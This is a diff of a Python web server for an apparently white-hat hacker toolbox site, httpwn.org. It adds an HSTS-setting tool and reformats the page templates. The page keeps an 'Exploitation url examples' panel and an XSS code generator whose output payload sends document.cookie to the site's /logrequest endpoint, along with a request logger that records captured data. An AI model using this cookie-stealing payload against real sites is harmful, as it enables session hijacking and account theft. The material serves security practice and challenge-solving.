@@ -31,15 +31,31 @@ from settings import settings
 
 
 def tool(method, url, version, headers, lines):
+    if method == "POST":
+        print "Connection: close"
+        try:
+            print "Strict-Transport-Security: max-age=%d" % int(lines[-1])
+        except: #You dont gfet the header if you do funky stuff
+            pass 
+        print ""
+        return        
+
+
     html_headers()
     print ""
     if method == "HEAD": return
     prologue()
     print """
-        YES I will fix XSS parsing someday, and stop using text/plain. But not today.
-        <div>
-            this is your request:<br>
-            <iframe src="/myrequest" style="background-color:white;" /><!-- Because good idea to allow change to the background color in a text/plain iframe #mostbrowsers, (black on black reads funny, that why) -->
+        <script>
+            function hstsRequest()
+            {
+                var request = new XMLHttpRequest();
+                request.open('POST', 'https://httpwn.org/tools', true);
+                request.send( document.getElementById("HSTS-time").value );
+            }            
+        </script>
+        <div height:500px;" >
+                Lock in Https session using HSTS for <input type="text" style="width:75px" id="HSTS-time" value="60" /> seconds: <input type="button" onclick="hstsRequest();" value="->" />
         </div>
 
     """
@@ -62,6 +78,7 @@ def feedback_url(method, url, version, headers, lines):
 
 def log_request(method, url, version, headers, lines):
     lines = ["---------- %s:%s @ %f ----------" % (get_ip(), get_port(), time())] + lines + ["-----------------------------------------------------"]
+    
     raw_text = "\n".join(lines).strip()
     with open(settings["requestlogpath"], "a") as f:
         f.write("%s\n" % raw_text)
@@ -115,6 +132,7 @@ def css(method, url, version, headers, lines):
 div
 {
     border: 1px solid #0F0;
+    padding: 10px;
 }
 
 input
@@ -139,6 +157,7 @@ a
 .noborder
 {
     border: none; 
+    padding: 0px;
 }
 .red
 {
@@ -160,7 +179,7 @@ def statement(method, url, version, headers, lines):
     if method == "HEAD": return
     prologue()
     print """
-    <div style="padding:10px">
+    <div>
         <p>This website is meant as a fun exercise and toolbox for white-hat hackers to solve challenges on other sites or maybe even find a hole in this one.</p>
         <p>As long as you restrict yourself ONLY to the webserver (software running on port 80 &amp 443) and website logic you have my permission to try to find holes in the security IF you responsibly disclose them to me.
         This server runs on a VM which I rent so mind your scope. I'm the technical contact of this domain so you can find my e-mail there. hint: 'whois httpwn.org | grep "Admin Email:"'</p>
@@ -173,6 +192,8 @@ def statement(method, url, version, headers, lines):
 def mainsite(method, url, version, headers, lines):
 
     reverse_proto = ["https","http"][is_secure()]
+    server_name = settings["servername"]
+    protocol_name = proto_name()
 
     lock_img = ["""
     <svg width="39" height="63">
@@ -289,28 +310,28 @@ The green part are tools you can use. <input type="button" value="Hide" onclick=
 
 
 <div style="text-align:center">
-<a href=\"""" +  reverse_proto + """://httpwn.org" style="text-decoration: none">""" + lock_img[is_secure()] + """</a>
-    <font style="font-size:500%">""" + settings["servername"] + """</font>
+<a href="%s://httpwn.org" style="text-decoration: none">%s</a>
+    <font style="font-size:500%%">%s</font>
 </div>
 
 <br>
 
-<div id="htmldisplaytool" style="display:none; padding:10px;">
+<div id="htmldisplaytool" style="display:none;">
 
-    <input type="text" value="HTTP/1.1 200 OK" style="width:100%;" readonly="readonly">
+    <input type="text" value="HTTP/1.1 200 OK" style="width:100%%;" readonly="readonly">
 
-<textarea style="width:100%;height:75px" id="headers">
+<textarea style="width:100%%;height:75px" id="headers">
 Connection: close
 Content-Type: text/html
 </textarea> 
 
     <br>
 
-<textarea style="width:100%;height:200px" id="content">
+<textarea style="width:100%%;height:200px" id="content">
 <html>
     <head>
         <script>
-            alert("Hello, welcome to """ + settings["servername"] + """");
+            alert("Hello, welcome to "%s");
         </script>
     </head>
     <body />
@@ -319,7 +340,7 @@ Content-Type: text/html
     <script>
         function apply()
         {
-            setTip( '""" + proto_name() + """' + '://' + '""" + settings["servername"] + """' + '/htmldisplay/' + encodeURIComponent( document.getElementById("headers").value) + "%0A" + encodeURIComponent(document.getElementById("content").value), true );
+            setTip( '%s' + '://' + '%s' + '/htmldisplay/' + encodeURIComponent( document.getElementById("headers").value) + "%%0A" + encodeURIComponent(document.getElementById("content").value), true );
         }
     </script>
     <input type="button" value="Generate" onclick="apply();" />  <input type="button" value="Hide" onclick="hideAll();"/>
@@ -339,10 +360,10 @@ Content-Type: text/html
     }
 </script>
 
-<table style="width:100%;margin-left:auto;margin-right:auto;table-layout:fixed;">
+<table style="width:100%%;margin-left:auto;margin-right:auto;table-layout:fixed;">
     <tr>
         <td valign="top">
-            <div style="padding:5px;margin-right:10px">
+            <div style="margin-right:10px">
                 <div class="noborder" style="text-align:center;">
                     <b><font>Server-side readout</font></b>
                 </div>
@@ -357,22 +378,22 @@ Content-Type: text/html
             </div>
         </td>
         <td valign="top">
-            <div class="red" style="padding:5px;margin-left:10px;margin-right:10px;">
+            <div class="red" style="margin-left:10px;margin-right:10px;">
                 <div class="noborder" style="text-align:center;">
                     <b><font class="red">Exploitation url examples</font></b>
                 </div>
                 <br>
-                <div class="red noborder"" style="text-align:center;">
+                <div class="red noborder" style="text-align:center;">
                     <br>
                     <br>
-                    <a href="/logrequest?q=SESSIONID%3Dsecret" onmouseout="clearDiv()" onmouseover="setTip('Nice logging facility that logs all requests being made')">Log requests</a><br>
-                    <a href="/htmldisplay/Connection%3A%20close%0AContent-Type%3A%20text%2Fplain%0A%0Aplain%20text%20example" onmouseout="clearDiv()" onmouseover="setTip('Serve a page of your chosing, inlcuding customisable HTTP headers (This example displays some text)')">Html diplay</a><br>
+                    <a href="/logrequest?q=SESSIONID%%3Dsecret" onmouseout="clearDiv()" onmouseover="setTip('Nice logging facility that logs all requests being made')">Log requests</a><br>
+                    <a href="/htmldisplay/Connection%%3A%%20close%%0AContent-Type%%3A%%20text%%2Fplain%%0A%%0Aplain%%20text%%20example" onmouseout="clearDiv()" onmouseover="setTip('Serve a page of your chosing, inlcuding customisable HTTP headers (This example displays some text)')">Html diplay</a><br>
                     <br>
                 </div>
             </div>
         </td>
         <td valign="top">
-            <div style="padding:5px;margin-left:10px">
+            <div style="margin-left:10px">
                 <div class="noborder" style="text-align:center;">
                     <b><font>Convenient generators</font></b>
                 </div>
@@ -383,7 +404,7 @@ Content-Type: text/html
                     <script>
                         function xssTip()
                         {
-                            setTip('&ltscript&gt<br>var i = new Image();<br>i.src = \"""" + proto_name() + "://" + settings["servername"] + """/logrequest?q=\" + escape(document.cookie);<br>&lt/script&gt', true);
+                            setTip('&ltscript&gt<br>var i = new Image();<br>i.src = "%s://%s/logrequest?q=" + escape(document.cookie);<br>&lt/script&gt', true);
                         }
                     </script>
                     <a href="#" onclick="hideAll();xssTip();">Generate code to XSS<br>
@@ -399,5 +420,5 @@ Content-Type: text/html
 <div class="noborder" style="text-align:center;">
     <a href="/statement" target="_blank" style="color:#050;">About this site, resposible disclosure and github.</a>
 </div>
-"""
+""" % (reverse_proto, lock_img[is_secure()], server_name, server_name, protocol_name, server_name, protocol_name, server_name)
     epilogue()
